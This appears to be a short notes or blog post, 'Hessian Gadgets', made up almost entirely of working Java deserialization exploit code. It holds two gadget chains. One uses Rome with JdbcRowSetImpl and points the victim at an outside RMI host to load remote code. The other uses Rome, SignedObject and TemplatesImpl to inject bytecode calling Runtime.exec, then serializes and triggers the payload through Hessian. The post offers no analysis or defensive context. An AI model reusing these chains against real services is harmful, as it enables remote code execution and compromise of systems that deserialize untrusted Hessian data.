---
title: "Hessian Gadgets"
author: ["4shen0ne"]
tags: ["java"]
draft: false
---

## Rome + JdbcRowSetImpl {#rome-plus-jdbcrowsetimpl}

```java
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.example.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

public class Rome {
    public static Object getObject() throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName("rmi://rmi.f2ac8922fc.ipv6.1433.eu.org:1234");
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        return makeMap(root, root);
    }

    static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
```


## Rome + SignedObject + TemplatesImpl {#rome-plus-signedobject-plus-templatesimpl}

```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

public class SignedObjectGadget {
    public static void main(String[] args) throws Exception {
        byte[] code = getTemplates();
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates, "_tfactory", new TransformerFactoryImpl());
        setValue(templates, "_name", "Aiwin");
        setValue(templates, "_class", null);
        setValue(templates, "_bytecodes", codes);
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(String.class, "aiwin");
        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean, "aaa");
        setValue(equalsBean, "beanClass", ToStringBean.class);
        setValue(equalsBean, "obj", toStringBean);

        //SignedObject
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
        ToStringBean toStringBean_sign = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean_sign = new EqualsBean(String.class, "aiwin");
        HashMap hashMap_sign = new HashMap();
        hashMap_sign.put(equalsBean_sign, "aaa");
        setValue(equalsBean_sign, "beanClass", ToStringBean.class);
        setValue(equalsBean_sign, "obj", toStringBean_sign);
        String result = Hessian_serialize(hashMap_sign);
        Hessian_unserialize(result);
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"kcalc\");";
        ctClass.makeClassInitializer().insertBefore(block);
        return ctClass.toBytecode();
    }

    public static String Hessian_serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(object);
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static void Hessian_unserialize(String obj) throws IOException {
        byte[] code = Base64.getDecoder().decode(obj);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(code);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```
